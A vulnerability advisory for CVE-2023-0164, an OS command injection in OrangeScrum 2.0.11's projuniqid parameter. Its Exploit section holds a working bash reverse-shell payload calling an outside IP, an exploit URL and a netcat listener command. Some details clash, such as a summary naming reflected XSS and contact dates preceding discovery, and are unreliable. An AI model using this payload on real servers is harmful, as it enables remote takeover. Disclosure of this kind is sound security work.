---
slug: advisories/queen/
title: OrangeScrum 2.0.11 - OS Command Injection via projuniqid
authors: Carlos Bello
writer: cbello
codename: queen
product: OrangeScrum 2.0.11
date: 2023-01-16 12:00 COT
cveid: CVE-2023-0164
severity: 9.9
description: OrangeScrum 2.0.11 - OS Command Injection via projuniqid
keywords: Fluid Attacks, Security, Vulnerabilities, Orangescrum, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                      |
| --------------------- | ---------------------------------------------------- |
| **Name**              | OrangeScrum 2.0.11 - Reflected XSS via imgName       |
| **Code name**         | [Queen](https://en.wikipedia.org/wiki/Queen_(band))  |
| **Product**           | OrangeScrum                                          |
| **Affected versions** | 2.0.11                                               |
| **State**             | Public                                               |
| **Release Date**      | 2023-01-16                                           |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | OS Command Injection                                                                                   |
| **Rule**              | [404. OS Command Injection](https://docs.fluidattacks.com/criteria/vulnerabilities/404)                |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 9.9                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0164](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0164)                          |

## Description

OrangeScrum version 2.0.11 allows an authenticated external attacker to
execute arbitrary commands on the server. This is possible because the
application injects an attacker-controlled parameter into a system
function.

## Vulnerability

This vulnerability occurs because the application injects an attacker-controlled
parameter into a system function.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious HTML
code to an application user.

### Exploit

To exploit this vulnerability, we just need to send the malicious command we want
the server to execute through the projuniqid parameter using the `$()` syntax.

```bash
$(bash -i+>& /dev/tcp/67.205.165.158/3000 0>&1)
```

```txt
https://retr02332bughunter.orangescrum.com/log_times/download_pdf_timelog?projuniqid=$(bash+-i+>%26+/dev/tcp/67.205.165.158/3000+0>%261)&usrid=&date=&strddt=&enddt=&dt_format=d/m/y&checkedFields=date,usr_name,task_no,task_title,hours,description,start,end,break,billable
```

Thus, we will only have to execute the command `nc -lvp 3000` on the attacker's malicious
server to receive the reverse shell from the victim server.

## Evidence of exploitation

![vulnerability-code-orangescrum](https://user-images.githubusercontent.com/51862990/211672912-1eb574f6-20bb-475d-8303-f443ba156163.png)

![vulnerability-orangescrum](https://user-images.githubusercontent.com/51862990/211672802-e1fd6b44-1f5a-414f-8f27-5fbba9d40267.png)

![explotation-orangescrum](https://user-images.githubusercontent.com/51862990/211674614-e71238c4-0fe3-4029-bb71-15c35c46e0e2.gif)

![exploit-success-orangescrum](https://user-images.githubusercontent.com/51862990/211672619-a0006c75-3f39-4cfd-9791-af389d8a37f2.png)

## Our security policy

We have reserved the ID CVE-2023-0164 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OrangeScrum 2.0.11

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Orangescrum/orangescrum/>

## Timeline

<time-lapse
  discovered="2023-01-10"
  contacted="2022-01-10"
  replied="2022-01-10"
  confirmed="2022-01-10"
  patched=""
  disclosure="2023-01-16">
</time-lapse>
